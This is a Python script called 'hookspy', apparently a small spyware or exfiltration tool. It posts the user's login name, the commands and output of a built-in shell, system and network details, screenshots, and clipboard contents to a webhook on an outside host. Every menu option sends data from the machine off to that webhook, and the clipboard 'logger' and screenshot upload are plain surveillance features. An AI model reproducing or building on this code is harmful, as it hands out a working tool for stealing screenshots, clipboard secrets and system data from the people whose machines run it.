import os
import requests
import pyperclip

WEBHOOK = "webhook" #put your here

user = os.getlogin()
requests.post(WEBHOOK, data={"content": f"```Logged in as {user}```"})  
print(f"Logged in as {user}")

cwd = os.getcwd()
while True:
    print(f"""
    \n hookspy v0.1-alpha        https://github.com/realpnut/hookspy
    0 - Exit
    1 - Shell
    2 - System Info
    3 - Screenshot
    4 - Paperclip logger
    5 - Network Info
    """)
    uput = input("Choose an option: ")

    if uput == "1":
        while True:
            cmd = input(f"{cwd}> ")

            if cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    cwd = os.getcwd()
                except:
                    print("blad cd")
                continue
            out = os.popen(cmd).read()
            print(out)
            requests.post(WEBHOOK, data={"content": f"```[{cwd}]> {cmd}```"})
            requests.post(WEBHOOK, data={"content": f"```{out}```"})
    elif uput == "2":
        out = os.popen("fastfetch --logo none --pipe").read()
        requests.post(WEBHOOK, data={"content": f"```{out}```"})
    elif uput == "3":
        os.system("scrot /tmp/screenshot.png")
        with open("/tmp/screenshot.png", "rb") as f:
            requests.post(WEBHOOK, data={"content": f"```Screenshotting...```"})
            requests.post(WEBHOOK, files={"file": f})
        os.system("rm /tmp/screenshot.png")
    elif uput == "4":
        text = pyperclip.paste()
        print(f"Clipboard content: {text}")
        requests.post(WEBHOOK, data={"content": f"```Clipboard content: {text}```"})
    elif uput == "5":
        out = os.popen("ifconfig").read()
        requests.post(WEBHOOK, data={"content": f"```{out}```"})
        out = os.popen("curl ipinfo.io").read()
        requests.post(WEBHOOK, data={"content": f"```{out}```"})
